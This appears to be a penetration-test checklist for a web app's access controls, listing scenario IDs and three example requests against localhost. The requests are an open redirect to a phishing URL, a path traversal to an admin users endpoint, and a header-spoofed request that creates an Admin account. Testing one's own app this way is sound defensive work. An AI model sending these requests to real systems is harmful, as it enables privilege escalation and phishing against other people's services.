A01 Broken Access Control

SC-01 IDOR · SC-08/76/77 BFLA · SC-33 path · SC-71 open redirect · SC-78/79 sessions · SC-87 register roles · SC-95 export.

# Open redirect sau login (SC-71)
http://localhost:3000/dang-nhap?next=https://evil.example/phish

# BFF path traversal (SC-33)
curl -s "http://localhost:3100/api/bff/catalog/../identity/admin/users" -b "nexatech_admin_session=..."

# SC-76 create as Customer
curl -s -X POST http://localhost:3001/api/v1/admin/users \
  -H "content-type: application/json" \
  -H "x-user-roles: Customer" \
  -d "{\"email\":\"x@evil.com\",\"fullName\":\"X\",\"password\":\"1\",\"roles\":[\"Admin\"]}"
